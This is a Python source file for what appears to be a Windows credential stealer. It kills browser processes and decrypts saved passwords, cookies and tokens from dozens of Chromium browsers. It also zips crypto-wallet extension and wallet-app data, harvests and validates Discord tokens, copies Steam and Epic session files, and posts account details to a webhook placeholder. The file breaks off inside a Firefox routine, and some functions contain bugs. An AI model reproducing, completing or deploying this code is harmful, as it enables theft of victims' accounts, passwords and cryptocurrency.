import base64
import json
import os
import re
import requests
import json
import sqlite3
import shutil
import subprocess
import zipfile
import sys
from zipfile import ZipFile
from urllib.request import Request, urlopen
import time
import sysinfo
from PIL import ImageGrab
import pyperclip
def get_screenshot(path,file_name="screenshot.png"):
    try:
        path = os.path.join(path,file_name)
        screenshot = ImageGrab.grab()
        screenshot.save(path)
    except Exception as e:
        pass

TOKENCOUNT = 0
CREATE_NO_WINDOW = CREATE_NO_WINDOW = 0x00000008
# main
import win32crypt
from Crypto.Cipher import AES
import requests
import websocket

SYSINFO = sysinfo.get_system_info()

user_id = "0"
IP_ADRESS = requests.get("https://api.ipify.org").text
USER_PROFILE = os.getenv('USERPROFILE')
APPDATA = os.getenv('APPDATA')
LOCALAPPDATA = os.getenv('LOCALAPPDATA')
STORAGE_PATH = os.path.join(APPDATA, "Microsoft Store")
if os.path.exists(STORAGE_PATH):
    shutil.rmtree(STORAGE_PATH)
os.mkdir(STORAGE_PATH)


MAIN_URL = "WEBHOOK_HERE"
PROGRAMFILESX86 = os.getenv("ProgramFiles(x86)")

COOKIECOUNT = 0
FILES = []

CHROME_PATHS = [
    {"name": "Chrome", "path": os.path.join(LOCALAPPDATA, "Google", "Chrome", "User Data"), "taskname": "chrome.exe", "exepath": "C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe"},
	{"name": "Chrome (x86)", "path": os.path.join(LOCALAPPDATA, "Google(x86)", "Chrome", "User Data"), "taskname": "chrome.exe", "exepath": PROGRAMFILESX86 + "\\Google\\Chrome\\Application\\chrome.exe"},
	{"name": "Chrome SxS", "path": os.path.join(LOCALAPPDATA, "Google", "Chrome SxS", "User Data"), "taskname": "chrome.exe", "exepath": LOCALAPPDATA + "\\Google\\Chrome SxS\\Application\\chrome.exe"},
	{"name": "Edge", "path": os.path.join(LOCALAPPDATA, "Microsoft", "Edge", "User Data"), "taskname": "msedge.exe", "exepath": PROGRAMFILESX86 + "\\Microsoft\\Edge\\Application\\msedge.exe"},
	{"name": "Brave", "path": os.path.join(LOCALAPPDATA, "BraveSoftware", "Brave-Browser", "User Data"), "taskname": "brave.exe", "exepath": "C:\\Program Files\\BraveSoftware\\Brave-Browser\\Application\\brave.exe"},
]

CHROMIUM_BROWSERS = [
    {"name": "Chrome", "path": os.path.join(LOCALAPPDATA, "Google", "Chrome", "User Data"), "taskname": "chrome.exe", "exepath": "C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe"},
	{"name": "Chrome (x86)", "path": os.path.join(LOCALAPPDATA, "Google(x86)", "Chrome", "User Data"), "taskname": "chrome.exe", "exepath": PROGRAMFILESX86 + "\\Google\\Chrome\\Application\\chrome.exe"},
	{"name": "Chrome SxS", "path": os.path.join(LOCALAPPDATA, "Google", "Chrome SxS", "User Data"), "taskname": "chrome.exe", "exepath": LOCALAPPDATA + "\\Google\\Chrome SxS\\Application\\chrome.exe"},
	{"name": "Edge", "path": os.path.join(LOCALAPPDATA, "Microsoft", "Edge", "User Data"), "taskname": "msedge.exe", "exepath": PROGRAMFILESX86 + "\\Microsoft\\Edge\\Application\\msedge.exe"},
	{"name": "Brave", "path": os.path.join(LOCALAPPDATA, "BraveSoftware", "Brave-Browser", "User Data"), "taskname": "brave.exe", "exepath": "C:\\Program Files\\BraveSoftware\\Brave-Browser\\Application\\brave.exe"},
    {"name": "Opera", "path": os.path.join(APPDATA, "Opera Software", "Opera Stable"), "taskname": "opera.exe", "exepath": ""},
    {"name": "Opera GX", "path": os.path.join(APPDATA, "Opera Software", "Opera GX Stable"), "taskname": "opera.exe", "exepath": ""},
    {"name": "Yandex", "path": os.path.join(APPDATA, "Yandex", "YandexBrowser", "User Data"), "taskname": "yandex.exe", "exepath": ""},
    {"name": "Chromium", "path": os.path.join(LOCALAPPDATA, "Chromium", "User Data"), "taskname": "chromium.exe", "exepath": ""},
    {"name": "Thorium", "path": os.path.join(LOCALAPPDATA, "Thorium", "User Data"), "taskname": "thorium.exe", "exepath": ""},
    {"name": "Maple", "path": os.path.join(LOCALAPPDATA, "MapleStudio", "ChromePlus", "User Data"), "taskname": "maple.exe", "exepath": ""},
    {"name": "Iridium", "path": os.path.join(LOCALAPPDATA, "Iridium", "User Data"), "taskname": "iridium.exe", "exepath": ""},
    {"name": "7Star", "path": os.path.join(LOCALAPPDATA, "7Star", "7Star", "User Data"), "taskname": "7star.exe", "exepath": ""},
    {"name": "CentBrowser", "path": os.path.join(LOCALAPPDATA, "CentBrowser", "User Data"), "taskname": "centbrowser.exe", "exepath": ""},
    {"name": "Chedot", "path": os.path.join(LOCALAPPDATA, "Chedot", "User Data"), "taskname": "chedot.exe", "exepath": ""},
    {"name": "Vivaldi", "path": os.path.join(LOCALAPPDATA, "Vivaldi", "User Data"), "taskname": "vivaldi.exe", "exepath": ""},
    {"name": "Kometa", "path": os.path.join(LOCALAPPDATA, "Kometa", "User Data"), "taskname": "kometa.exe", "exepath": ""},
    {"name": "Elements", "path": os.path.join(LOCALAPPDATA, "Elements Browser", "User Data"), "taskname": "elements.exe", "exepath": ""},
    {"name": "Epic Privacy Browser", "path": os.path.join(LOCALAPPDATA, "Epic Privacy Browser", "User Data"), "taskname": "epic.exe", "exepath": ""},
    {"name": "Uran", "path": os.path.join(LOCALAPPDATA, "uCozMedia", "Uran", "User Data"), "taskname": "uran.exe", "exepath": ""},
    {"name": "Fenrir", "path": os.path.join(LOCALAPPDATA, "Fenrir Inc", "Sleipnir5", "setting", "modules", "ChromiumViewer"), "taskname": "fenrir.exe", "exepath": ""},
    {"name": "Catalina", "path": os.path.join(LOCALAPPDATA, "CatalinaGroup", "Citrio", "User Data"), "taskname": "catalina.exe", "exepath": ""},
    {"name": "Coowon", "path": os.path.join(LOCALAPPDATA, "Coowon", "Coowon", "User Data"), "taskname": "coowon.exe", "exepath": ""},
    {"name": "Liebao", "path": os.path.join(LOCALAPPDATA, "liebao", "User Data"), "taskname": "liebao.exe", "exepath": ""},
    {"name": "QIP Surf", "path": os.path.join(LOCALAPPDATA, "QIP Surf", "User Data"), "taskname": "qipsurf.exe", "exepath": ""},
    {"name": "Orbitum", "path": os.path.join(LOCALAPPDATA, "Orbitum", "User Data"), "taskname": "orbitum.exe", "exepath": ""},
    {"name": "Dragon", "path": os.path.join(LOCALAPPDATA, "Comodo", "Dragon", "User Data"), "taskname": "dragon.exe", "exepath": ""},
    {"name": "360Browser", "path": os.path.join(LOCALAPPDATA, "360Browser", "Browser", "User Data"), "taskname": "360browser.exe", "exepath": ""},
    {"name": "Maxthon", "path": os.path.join(LOCALAPPDATA, "Maxthon3", "User Data"), "taskname": "maxthon.exe", "exepath": ""},
    {"name": "K-Melon", "path": os.path.join(LOCALAPPDATA, "K-Melon", "User Data"), "taskname": "kmelon.exe", "exepath": ""},
    {"name": "CocCoc", "path": os.path.join(LOCALAPPDATA, "CocCoc", "Browser", "User Data"), "taskname": "coccoc.exe", "exepath": ""},
    {"name": "Amigo", "path": os.path.join(LOCALAPPDATA, "Amigo", "User Data"), "taskname": "amigo.exe", "exepath": ""},
    {"name": "Torch", "path": os.path.join(LOCALAPPDATA, "Torch", "User Data"), "taskname": "torch.exe", "exepath": ""},
    {"name": "Sputnik", "path": os.path.join(LOCALAPPDATA, "Sputnik", "Sputnik", "User Data"), "taskname": "sputnik.exe", "exepath": ""},
    {"name": "DCBrowser", "path": os.path.join(LOCALAPPDATA, "DCBrowser", "User Data"), "taskname": "dcbrowser.exe", "exepath": ""},
    {"name": "UR Browser", "path": os.path.join(LOCALAPPDATA, "UR Browser", "User Data"), "taskname": "urbrowser.exe", "exepath": ""},
    {"name": "Slimjet", "path": os.path.join(LOCALAPPDATA, "Slimjet", "User Data"), "taskname": "slimjet.exe", "exepath": ""},
]

CHROMIUM_SUBPATHS = [
    {"path": ""},
    {"path": "Default"},
    {"path": "Profile 1"},
    {"path": "Profile 2"},
    {"path": "Profile 3"},
    {"path": "Profile 4"},
    {"path": "Profile 5"},
]

BROWSER_EXTENSIONS = [
    {"name": "Authenticator", "path": "\\Local Extension Settings\\bhghoamapcdpbohphigoooaddinpkbai"},
    {"name": "Binance", "path": "\\Local Extension Settings\\fhbohimaelbohpjbbldcngcnapndodjp"},
    {"name": "Bitapp", "path": "\\Local Extension Settings\\fihkakfobkmkjojpchpfgcmhfjnmnfpi"},
    {"name": "BoltX", "path": "\\Local Extension Settings\\aodkkagnadcbobfpggfnjeongemjbjca"},
    {"name": "Coin98", "path": "\\Local Extension Settings\\aeachknmefphepccionboohckonoeemg"},
    {"name": "Coinbase", "path": "\\Local Extension Settings\\hnfanknocfeofbddgcijnmhnfnkdnaad"},
    {"name": "Core", "path": "\\Local Extension Settings\\agoakfejjabomempkjlepdflaleeobhb"},
    {"name": "Crocobit", "path": "\\Local Extension Settings\\pnlfjmlcjdjgkddecgincndfgegkecke"},
    {"name": "Equal", "path": "\\Local Extension Settings\\blnieiiffboillknjnepogjhkgnoapac"},
    {"name": "Ever", "path": "\\Local Extension Settings\\cgeeodpfagjceefieflmdfphplkenlfk"},
    {"name": "ExodusWeb3", "path": "\\Local Extension Settings\\aholpfdialjgjfhomihkjbmgjidlcdno"},
    {"name": "Fewcha", "path": "\\Local Extension Settings\\ebfidpplhabeedpnhjnobghokpiioolj"},
    {"name": "Finnie", "path": "\\Local Extension Settings\\cjmkndjhnagcfbpiemnkdpomccnjblmj"},
    {"name": "Guarda", "path": "\\Local Extension Settings\\hpglfhgfnhbgpjdenjgmdgoeiappafln"},
    {"name": "Guild", "path": "\\Local Extension Settings\\nanjmdknhkinifnkgdcggcfnhdaammmj"},
    {"name": "HarmonyOutdated", "path": "\\Local Extension Settings\\fnnegphlobjdpkhecapkijjdkgcjhkib"},
    {"name": "Iconex", "path": "\\Local Extension Settings\\flpiciilemghbmfalicajoolhkkenfel"},
    {"name": "Jaxx Liberty", "path": "\\Local Extension Settings\\cjelfplplebdjjenllpjcblmjkfcffne"},
    {"name": "Kaikas", "path": "\\Local Extension Settings\\jblndlipeogpafnldhgmapagcccfchpi"},
    {"name": "KardiaChain", "path": "\\Local Extension Settings\\pdadjkfkgcafgbceimcpbkalnfnepbnk"},
    {"name": "Keplr", "path": "\\Local Extension Settings\\dmkamcknogkgcdfhhbddcghachkejeap"},
    {"name": "Liquality", "path": "\\Local Extension Settings\\kpfopkelmapcoipemfendmdcghnegimn"},
    {"name": "MEWCX", "path": "\\Local Extension Settings\\nlbmnnijcnlegkjjpcfjclmcfggfefdm"},
    {"name": "MaiarDEFI", "path": "\\Local Extension Settings\\dngmlblcodfobpdpecaadgfbcggfjfnm"},
    {"name": "Martian", "path": "\\Local Extension Settings\\efbglgofoippbgcjepnhiblaibcnclgk"},
    {"name": "Math", "path": "\\Local Extension Settings\\afbcbjpbpfadlkmhmclhkeeodmamcflc"},
    {"name": "Metamask", "path": "\\Local Extension Settings\\nkbihfbeogaeaoehlefnkodbefgpgknn"},
    {"name": "Metamask2", "path": "\\Local Extension Settings\\ejbalbakoplchlghecdalmeeeajnimhm"},
    {"name": "Mobox", "path": "\\Local Extension Settings\\fcckkdbjnoikooededlapcalpionmalo"},
    {"name": "Nami", "path": "\\Local Extension Settings\\lpfcbjknijpeeillifnkikgncikgfhdo"},
    {"name": "Nifty", "path": "\\Local Extension Settings\\jbdaocneiiinmjbjlgalhcelgbejmnid"},
    {"name": "Oxygen", "path": "\\Local Extension Settings\\fhilaheimglignddkjgofkcbgekhenbh"},
    {"name": "PaliWallet", "path": "\\Local Extension Settings\\mgffkfbidihjpoaomajlbgchddlicgpn"},
    {"name": "Petra", "path": "\\Local Extension Settings\\ejjladinnckdgjemekebdpeokbikhfci"},
    {"name": "Phantom", "path": "\\Local Extension Settings\\bfnaelmomeimhlpmgjnjophhpkkoljpa"},
    {"name": "Pontem", "path": "\\Local Extension Settings\\phkbamefinggmakgklpkljjmgibohnba"},
    {"name": "Ronin", "path": "\\Local Extension Settings\\fnjhmkhhmkbjkkabndcnnogagogbneec"},
    {"name": "Safepal", "path": "\\Local Extension Settings\\lgmpcpglpngdoalbgeoldeajfclnhafa"},
    {"name": "Saturn", "path": "\\Local Extension Settings\\nkddgncdjgjfcddamfgcmfnlhccnimig"},
    {"name": "Slope", "path": "\\Local Extension Settings\\pocmplpaccanhmnllbbkpgfliimjljgo"},
    {"name": "Solfare", "path": "\\Local Extension Settings\\bhhhlbepdkbapadjdnnojkbgioiodbic"},
    {"name": "Sollet", "path": "\\Local Extension Settings\\fhmfendgdocmcbmfikdcogofphimnkno"},
    {"name": "Starcoin", "path": "\\Local Extension Settings\\mfhbebgoclkghebffdldpobeajmbecfk"},
    {"name": "Swash", "path": "\\Local Extension Settings\\cmndjbecilbocjfkibfbifhngkdmjgog"},
    {"name": "TempleTezos", "path": "\\Local Extension Settings\\ookjlbkiijinhpmnjffcofjonbfbgaoc"},
    {"name": "TerraStation", "path": "\\Local Extension Settings\\aiifbnbfobpmeekipheeijimdpnlpgpp"},
    {"name": "Tokenpocket", "path": "\\Local Extension Settings\\mfgccjchihfkkindfppnaooecgfneiii"},
    {"name": "Ton", "path": "\\Local Extension Settings\\nphplpgoakhhjchkkhmiggakijnkhfnd"},
    {"name": "Tron", "path": "\\Local Extension Settings\\ibnejdfjmmkpcnlpebklmnkoeoihofec"},
    {"name": "Trust Wallet", "path": "\\Local Extension Settings\\egjidjbpglichdcondbcbdnbeeppgdph"},
    {"name": "Wombat", "path": "\\Local Extension Settings\\amkmjjmmflddogmhpjloimipbofnfjih"},
    {"name": "XDEFI", "path": "\\Local Extension Settings\\hmeobnfnfcmdkdcmlblgagmfpfboieaf"},
    {"name": "XMR.PT", "path": "\\Local Extension Settings\\eigblbgjknlfbajkfhopmcojidlgcehm"},
    {"name": "XinPay", "path": "\\Local Extension Settings\\bocpokimicclpaiekenaeelehdjllofo"},
    {"name": "Yoroi", "path": "\\Local Extension Settings\\ffnbelfdoeiohenkjibnmadjiehjhajb"},
    {"name": "iWallet", "path": "\\Local Extension Settings\\kncchdigobghenbbaddojjnnaogfppfj"}
]

WALLET_PATHS = [
    {"name": "Atomic", "path": os.path.join(APPDATA, "atomic", "Local Storage", "leveldb")},
    {"name": "Exodus", "path": os.path.join(APPDATA, "Exodus", "exodus.wallet")},
    {"name": "Electrum", "path": os.path.join(APPDATA, "Electrum", "wallets")},
    {"name": "Electrum-LTC", "path": os.path.join(APPDATA, "Electrum-LTC", "wallets")},
    {"name": "Zcash", "path": os.path.join(APPDATA, "Zcash")},
    {"name": "Armory", "path": os.path.join(APPDATA, "Armory")},
    {"name": "Bytecoin", "path": os.path.join(APPDATA, "bytecoin")},
    {"name": "Jaxx", "path": os.path.join(APPDATA, "com.liberty.jaxx", "IndexedDB", "file__0.indexeddb.leveldb")},
    {"name": "Etherium", "path": os.path.join(APPDATA, "Ethereum", "keystore")},
    {"name": "Guarda", "path": os.path.join(APPDATA, "Guarda", "Local Storage", "leveldb")},
    {"name": "Coinomi", "path": os.path.join(APPDATA, "Coinomi", "Coinomi", "wallets")},
]

PATHS_TO_SEARCH = [
    USER_PROFILE + "\\Desktop",
    USER_PROFILE + "\\Documents",
    USER_PROFILE + "\\Downloads",
    USER_PROFILE + "\\OneDrive\\Documents",
    USER_PROFILE + "\\OneDrive\\Desktop",
]

FILE_KEYWORDS = [
        "passw",
        "mdp",
        "motdepasse",
        "mot_de_passe",
        "login",
        "secret",
        "account",
        "acount",
        "paypal",
        "banque",
        "metamask",
        "wallet",
        "crypto",
        "exodus",
        "discord",
        "2fa",
        "code",
        "memo",
        "compte",
        "token",
        "backup",
        "seecret"
        "passphrase"
]

ALLOWED_EXTENSIONS = [
    ".txt",
    ".log",
    ".doc",
    ".docx",
    ".xls",
    ".xlsx",
    ".ppt",
    ".pptx",
    ".odt",
    ".pdf",
    ".rtf",
    ".json",
    ".csv",
    ".db",
    ".jpg",
    ".jpeg",
    ".png",
    ".gif",
    ".webp",
    ".mp4"
]

DISCORD_PATHS = [
    {"name": "Discord", "path": os.path.join(APPDATA, "discord", "Local Storage", "leveldb")},
    {"name": "Discord Canary", "path": os.path.join(APPDATA, "discordcanary", "Local Storage", "leveldb")},
    {"name": "Discord PTB", "path": os.path.join(APPDATA, "discordptb", "Local Storage", "leveldb")},
    {"name": "Opera", "path": os.path.join(APPDATA, "Opera Software", "Opera Stable", "Local Storage", "leveldb")},
    {"name": "Opera GX", "path": os.path.join(APPDATA, "Opera Software", "Opera GX Stable", "Local Storage", "leveldb")},
    {"name": "Amigo", "path": os.path.join(LOCALAPPDATA, "Amigo", "User Data", "Local Storage", "leveldb")},
    {"name": "Torch", "path": os.path.join(LOCALAPPDATA, "Torch", "User Data", "Local Storage", "leveldb")},
    {"name": "Kometa", "path": os.path.join(LOCALAPPDATA, "Kometa", "User Data", "Local Storage", "leveldb")},
    {"name": "Orbitum", "path": os.path.join(LOCALAPPDATA, "Orbitum", "User Data", "Local Storage", "leveldb")},
    {"name": "CentBrowser", "path": os.path.join(LOCALAPPDATA, "CentBrowser", "User Data", "Local Storage", "leveldb")},
    {"name": "7Star", "path": os.path.join(LOCALAPPDATA, "7Star", "7Star", "User Data", "Local Storage", "leveldb")},
    {"name": "Sputnik", "path": os.path.join(LOCALAPPDATA, "Sputnik", "Sputnik", "User Data", "Local Storage", "leveldb")},
    {"name": "Vivaldi", "path": os.path.join(LOCALAPPDATA, "Vivaldi", "User Data", "Default", "Local Storage", "leveldb")},
    {"name": "Chrome SxS", "path": os.path.join(LOCALAPPDATA, "Google", "Chrome SxS", "User Data", "Local Storage", "leveldb")},
    {"name": "Chrome", "path": os.path.join(LOCALAPPDATA, "Google", "Chrome", "User Data", "Default", "Local Storage", "leveldb")},
    {"name": "Chrome1", "path": os.path.join(LOCALAPPDATA, "Google", "Chrome", "User Data", "Profile 1", "Local Storage", "leveldb")},
    {"name": "Chrome2", "path": os.path.join(LOCALAPPDATA, "Google", "Chrome", "User Data", "Profile 2", "Local Storage", "leveldb")},
    {"name": "Chrome3", "path": os.path.join(LOCALAPPDATA, "Google", "Chrome", "User Data", "Profile 3", "Local Storage", "leveldb")},
    {"name": "Chrome4", "path": os.path.join(LOCALAPPDATA, "Google", "Chrome", "User Data", "Profile 4", "Local Storage", "leveldb")},
    {"name": "Chrome5", "path": os.path.join(LOCALAPPDATA, "Google", "Chrome", "User Data", "Profile 5", "Local Storage", "leveldb")},
    {"name": "Epic Privacy Browser", "path": os.path.join(LOCALAPPDATA, "Epic Privacy Browser", "User Data", "Local Storage", "leveldb")},
    {"name": "Microsoft Edge", "path": os.path.join(LOCALAPPDATA, "Microsoft", "Edge", "User Data", "Default", "Local Storage", "leveldb")},
    {"name": "Uran", "path": os.path.join(LOCALAPPDATA, "uCozMedia", "Uran", "User Data", "Default", "Local Storage", "leveldb")},
    {"name": "Yandex", "path": os.path.join(LOCALAPPDATA, "Yandex", "YandexBrowser", "User Data", "Default", "Local Storage", "leveldb")},
    {"name": "Brave", "path": os.path.join(LOCALAPPDATA, "BraveSoftware", "Brave-Browser", "User Data", "Default", "Local Storage", "leveldb")},
    {"name": "Iridium", "path": os.path.join(LOCALAPPDATA, "Iridium", "User Data", "Default", "Local Storage", "leveldb")}
]

import sys
import ctypes

def run_as_admin():
    if not ctypes.windll.shell32.IsUserAnAdmin():
        ctypes.windll.shell32.ShellExecuteW(
            None, "runas", sys.executable, sys.argv[0], None, 1)
        sys.exit()

if __name__ == "__main__":
    run_as_admin()
    subprocess.run(["python", "main.py"])

DISCORD_TOKENS = []
PASSWORDS = []
COOKIES = []
WEB_DATA = []
DISCORD_IDS = []

# funcs 
def kill_process(process_name):
    command = ["taskkill", "/IM", process_name, "/T", "/F"]
    
    subprocess.Popen(
        command,
        stdout=subprocess.DEVNULL,
        stderr=subprocess.DEVNULL,
        creationflags=subprocess.CREATE_NO_WINDOW
    ) 
def taskkill(taskname):
    subprocess.run(
    ["taskkill", "/F", "/IM", taskname],
    stdout=subprocess.DEVNULL,
    stderr=subprocess.DEVNULL,
    creationflags=subprocess.CREATE_NO_WINDOW
    )
def decrypt_data(data, key):
    try:
        iv = data[3:15]
        data = data[15:]
        cipher = AES.new(key, AES.MODE_GCM, iv)
        return cipher.decrypt(data)[:-16].decode()
    except:
        return str(win32crypt.CryptUnprotectData(password, None, None, None, 0)[1])

def zip_to_storage(name, source, destination):
    print("yeah it was ME ALL ALONG NYE NYE")
    if os.path.isfile(source):
        with zipfile.ZipFile(destination + f"\\{name}.zip", "w") as z:
            z.write(source, os.path.basename(source))
    else:
        with zipfile.ZipFile(destination + f"\\{name}.zip", "w") as z:
            for root, dirs, files in os.walk(source):
                for file in files:
                    z.write(os.path.join(root, file), os.path.relpath(os.path.join(root, file), os.path.join(source, '..')))


def validate_discord_token(token):
    r = requests.get("https://discord.com/api/v9/users/@me", headers={"Authorization": token})
    if r.status_code == 200:
        return r.json()
    else:
        return None

        
# weird kill process should do the same thing



def chromiumcookies(profilepath):
    try:
        cookies_file = os.path.join(profilepath, "Network", "Cookies")
        temp_db = os.path.join(profilepath, f"{browser['name']}-ck.db")
        shutil.copy(cookies_file, temp_db)
        connection = sqlite3.connect(temp_db)
        cursor = connection.cursor()

        cursor.execute("SELECT host_key, name, encrypted_value FROM cookies")

        cookie_str = ""

        for row in cursor.fetchall():

            host = row[0]

            name = row[1]

            value = decrypt_data(row[2], decryption_key)

            cookie_str += f"{host}\tTRUE\t/\tFALSE\t13355861278849698\t{name}\t{value}\n"
            COOKIECOUNT = COOKIECOUNT+1
        COOKIES.append({"browser": browser["name"], "profile": subpath["name"], "cookies": base64.b64encode(cookie_str.encode()).decode()})
        cursor.close()
        connection.close()
        os.remove(temp_db)
    except: pass
    
from datetime import datetime

def get_steam_and_epic(dest_folder):
    os.makedirs(dest_folder, exist_ok=True)

    steam_folder = os.path.join(os.getenv('ProgramFiles(x86)'), "Steam")
    epic_folder = os.path.join(os.getenv('LOCALAPPDATA'), "EpicGamesLauncher")

    sessions = os.path.join(os.getenv('TEMP'), f"Vare_Sessions_{datetime.now().strftime('%m-%d-%Y')}_{os.urandom(4).hex()}")
    os.makedirs(sessions, exist_ok=True)

    def get_steam():
        if not os.path.exists(steam_folder):
            return
        steam_session = os.path.join(sessions, "Steam")
        os.makedirs(steam_session, exist_ok=True)

        
        shutil.copytree(os.path.join(steam_folder, "config"), os.path.join(steam_session, "config"), dirs_exist_ok=True)

        
        for file in os.listdir(steam_folder):
            if file.startswith("ssfn"):
                shutil.copy(os.path.join(steam_folder, file), os.path.join(steam_session, file))

        with zipfile.ZipFile(os.path.join(dest_folder, "Steam.zip"), 'w', zipfile.ZIP_DEFLATED) as zipf:
            for root, dirs, files in os.walk(steam_session):
                for file in files:
                    zipf.write(os.path.join(root, file), os.path.relpath(os.path.join(root, file), steam_session))
        shutil.rmtree(steam_session)

    def get_epic():
        if not os.path.exists(epic_folder):
            return
        epic_session = os.path.join(sessions, "EpicGames")
        os.makedirs(epic_session, exist_ok=True)

        
        shutil.copytree(os.path.join(epic_folder, "Saved", "Config"), os.path.join(epic_session, "Config"), dirs_exist_ok=True)
        shutil.copytree(os.path.join(epic_folder, "Saved", "Logs"), os.path.join(epic_session, "Logs"), dirs_exist_ok=True)
        shutil.copytree(os.path.join(epic_folder, "Saved", "Data"), os.path.join(epic_session, "Data"), dirs_exist_ok=True)

      
        with zipfile.ZipFile(os.path.join(dest_folder, "EpicGames.zip"), 'w', zipfile.ZIP_DEFLATED) as zipf:
            for root, dirs, files in os.walk(epic_session):
                for file in files:
                    zipf.write(os.path.join(root, file), os.path.relpath(os.path.join(root, file), epic_session))
        shutil.rmtree(epic_session)

    get_steam()
    get_epic()

    shutil.rmtree(sessions)

def get_discord_user_info(token: str, webhook_url=MAIN_URL):
    headers = {
        "Authorization": token,
        "Content-Type": "application/json"
    }
    
    user_response = requests.get("https://discord.com/api/v10/users/@me", headers=headers)
    
    if user_response.status_code != 200:
        return {"error": "Invalid token or failed request"}
    
    data = user_response.json()
    
    nitro_type = "None"
    if "premium_type" in data:
        nitro_type = {
            1: "Nitro Classic",
            2: "Nitro Boost"
        }.get(data["premium_type"], "None")
    
    BADGES_MAP = {
        1: "Discord Staff",
        2: "Discord Partner",
        4: "HypeSquad Events",
        8: "Bug Hunter Level 1",
        64: "House Bravery",
        128: "House Brilliance",
        256: "House Balance",
        512: "Early Supporter",
        16384: "Bug Hunter Level 2",
        131072: "Verified Bot Developer"
    }
    
    public_flags = data.get("public_flags", 0)
    badges = [name for flag, name in BADGES_MAP.items() if public_flags & flag]
    badges = ", ".join(badges) if badges else "None"

    user_avatar_url = f"https://cdn.discordapp.com/avatars/{data['id']}/{data['avatar']}.png"

    embed = {
        "embeds": [{
            "title": "<:Logo_Dark_Souls:1342581548855332905> | User Information",
            "color": 1651711,
            "thumbnail": {
                "url": user_avatar_url
            },
            "fields": [
                {"name": "<:keyy:1343298302837526528> Token", "value": f"`{token}`", "inline": False},
                {"name": "<:mann:1343280335160610947> Username", "value": f"`{data['username']}#{data['discriminator']}`", "inline": True},
                {"name": "<:emaill:1343280344110993439> Email", "value": f"`{data.get('email', 'N/A')}`", "inline": True},
                {"name": "<:idd:1343298839980937366> ID", "value": f"`{data['id']}`", "inline": True},
                {"name": "<:phonee:1343280337035464734> Phone", "value": f"`{data.get('phone', 'N/A')}`", "inline": True},
                {"name": "<:lockk:1343280340994887854> MFA Enabled?", "value": f"`{data.get('mfa_enabled', False)}`", "inline": True},
                {"name": "<:nitro:1343280348007628841> Nitro Type", "value": f"`{nitro_type}`", "inline": True},
                {"name": "<:staff:1326679494580375623> Badges", "value": f"`{badges}`", "inline": True},
            ]
        }],
        "avatar_url": "https://cdn.discordapp.com/attachments/1408813846013149314/1441806217281409116/asd23.jpg?ex=6923222d&is=6921d0ad&hm=51ade4992b8464086648fb8449bae794831a045c18d9df0e7ddc2768d942193f&"
    }
    
    requests.post(webhook_url, json=embed)

# main shit 

for browser in CHROMIUM_BROWSERS:
    taskkill(browser["taskname"])
    local_state = os.path.join(browser["path"], "Local State")
    if not os.path.exists(local_state): continue

    with open(local_state, "r", encoding="utf-8") as f:
        local_state = json.loads(f.read())

    key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])[5:]
    try:
        decryption_key = win32crypt.CryptUnprotectData(key, None, None, None, 0)[1]
    except:
        pass
    for subpath in CHROMIUM_SUBPATHS:

        if not os.path.exists(os.path.join(browser["path"], subpath["path"])): continue

        try:
            login_data_file = os.path.join(browser["path"], subpath["path"], "Login Data")
            temp_db = os.path.join(browser["path"], subpath["path"], f"{browser['name']}-pw.db")
            shutil.copy(login_data_file, temp_db)

            connection = sqlite3.connect(temp_db)

            cursor = connection.cursor()

            cursor.execute("SELECT origin_url, username_value, password_value FROM logins")

            for row in cursor.fetchall():

                origin_url = row[0]

                username = row[1]

                password = decrypt_data(row[2], decryption_key)

                if username or password:
                    PASSWORDS.append({"browser": browser["name"], "url": origin_url, "username": username, "password": password})
            cursor.close()
            connection.close()
            os.remove(temp_db)

        except:
            pass

        try:
            if browser["exepath"] == "":
                chromiumcookies(os.path.join(browser["path"], subpath["path"]))
        except:
            pass

        try:
            web_data_file = os.path.join(browser["path"], subpath["path"], "Web Data")

            temp_db = os.path.join(browser["path"], subpath["path"], f"{browser['name']}-webdata.db")

            shutil.copy(web_data_file, temp_db)

            connection = sqlite3.connect(temp_db)

            cursor = connection.cursor()

            cursor.execute("SELECT service, encrypted_token FROM token_service")

            for row in cursor.fetchall():
                web_service = row[0]
                web_token = decrypt_data(row[1], decryption_key)
                WEB_DATA.append({"account_id": web_service, "refresh_token": web_token})

            cursor.close()

            connection.close()
            os.remove(temp_db)
        except:
            pass

        for extension in BROWSER_EXTENSIONS:
            extension_path = os.path.join(browser["path"], subpath["path"]) + extension["path"]
            if os.path.exists(extension_path):
                try:
                    zip_to_storage(f"{browser['name']}-{subpath['path']}-{extension['name']}", extension_path, STORAGE_PATH)
                except:
                    pass

import re
import base64

def find_dc_token(file_path):
    """Finds and returns Discord-like tokens from a given file path."""
    pattern = r'"([A-Za-z0-9+/=]{6,}\.[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+)"'
    valid_tokens = []
    if not os.path.isfile(file_path):
        raise FileNotFoundError(f"The file at {file_path} does not exist.")
    
    with open(file_path, "rb") as f:
        content = f.read().decode(errors="ignore")
    matches = re.findall(pattern, content)
    for token in matches:
        part1 = token.split(".")[0]
        try:
            decoded = base64.b64decode(part1 + "==", validate=True) 
            if len(decoded) > 5:  
                valid_tokens.append(token)
        except base64.binascii.Error:
            continue  
    return valid_tokens 

    

# get discord token from logdb
for browser in CHROMIUM_BROWSERS:
    target_path = browser["path"]
    if not os.path.exists(target_path): continue
    target_path = os.path.join(target_path, "Default\\Local Storage\\leveldb")
    try:
        files = [
            target_path+"\\"+f for f in os.listdir(target_path)
            if os.path.isfile(os.path.join(target_path, f)) and f.lower().endswith((".ldb", ".log", "log"))
            ]
    except:continue
    print(files)
    for file in files:
        find = find_dc_token(file)
        if find:
            for token in find:
                token_data = validate_discord_token(token)
                if token_data:  # Fixed indentation
                    if token_data["id"] not in DISCORD_IDS:
                        DISCORD_IDS.append(token_data["id"])
                        username = token_data["username"] if token_data["discriminator"] == "0" else f"{token_data['username']}#{token_data['discriminator']}"
                        phone_number = token_data["phone"] if token_data["phone"] else "Not linked"
                        DISCORD_TOKENS.append(
                            {"token": token, "user_id": token_data["id"], "username": username,
                             "displayname": token_data["global_name"], "email": token_data["email"],
                             "phone": phone_number}
                        )
                        print(DISCORD_TOKENS)
                        TOKENCOUNT += 1
           
firefox_path = os.path.join(APPDATA, 'Mozilla', 'Firefox', 'Profiles')

if os.path.exists(firefox_path):
    taskkill("firefox.exe")
    for profile in os.listdir(firefox_path):

        try:

